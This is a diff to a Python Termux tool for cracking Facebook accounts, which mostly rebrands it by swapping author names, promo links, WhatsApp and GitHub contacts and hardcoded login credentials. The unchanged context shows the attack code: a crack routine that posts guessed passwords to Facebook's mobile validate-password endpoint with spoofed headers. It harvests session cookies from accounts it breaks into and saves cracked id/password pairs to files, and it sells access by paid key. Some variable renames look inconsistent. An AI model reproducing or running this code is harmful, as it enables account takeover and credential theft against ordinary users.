@@ -1,7 +1,7 @@
-#Open Source By Md Sabbir bhai
-""
+#Open Source By TANJID VAI
+"""
 
-REVERSE DONE BY Md Sabbir Bhai
+REVERSE DONE BY AHMED XD
 
 """
 
@@ -37,13 +37,13 @@ os.system("espeak -a 300 \"Checking,Update,\"")
 time.sleep(2)
 #os.system('clear')
 print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 6.3V...! ')
-os.system("espeak -a 300 \"Md Sabbir bhai UPDATE VERSION 8.3V,\"")
+os.system("espeak -a 300 \"Welcome to Md Sabbir bhai UPDATE VERSION 8.3V,\"")
 time.sleep(2)
 #os.system('clear')
 print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
 os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
 time.sleep(2)
-os.system(f'xdg-open https://youtube.com/@SabbirBhai-mo5jt?si=jkaQar9eX-KGIZIm')
+os.system(f'xdg-open https://youtube.com/@SabbirBhai-mo5jt?si=crn6IrRwySnmhlqC')
 os.system(f'xdg-open https://www.facebook.com/groups/266865079324430/?ref=share')
 ##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
 #------------------[ ASHIK-King ]-------------------#
@@ -240,7 +240,7 @@ logo =(f"""
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ASSALAMU ALAIKUM \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                 \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m SABBIR-BHAI TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m RX-ASHIK TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
@@ -277,7 +277,7 @@ def meyexudi():
       print(' \x1b[38;5;50m║══[𝟸] 30 DAY 400 TAKA ')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801840762780?text='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801935091078?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
@@ -289,7 +289,7 @@ def naima():
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  SABBIR BHAI,  V I P,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  SABBIR,  V I P,  Tools"')
 def back():
 	login()
 	
@@ -301,7 +301,7 @@ while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
     password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'ASHIK' and password == '63':
+    if username == 'SABBIR' and password == '1122':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -375,14 +375,14 @@ def menu():
     if ASHIK in ['111']:
         login()
         dump_massal()
-    elif ASHIK in ['1']:
+    elif SABBIR in ['1']:
         crack_file()
-    elif ASHIK in ['2','02']:
-        os.system('xdg-open https://github.com/RX-ASHIK')
+    elif SABBIR in ['2','02']:
+        os.system('xdg-open https://github.com/Rdx337')
         os.system("python nono.py")
-    elif ASHIK in ['3','03']:
+    elif SABBIR in ['3','03']:
         result()
-    elif ASHIK in ['0']:
+    elif SABBIR in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -724,7 +724,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,CP
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[SABBIR-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[ASHIK-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -752,7 +752,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mSABBIR-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                 print('\x1b[38;5;50m===============================================')
                 os.system('espeak -a 300 " SABBIR,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
@@ -785,7 +785,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-CP\033[1;91m] {idf} • {pw}')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mSABBIR-CP\033[1;91m] {idf} • {pw}')
                 print('\x1b[38;5;50m============================')
                 os.system('espeak -a 300 " CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
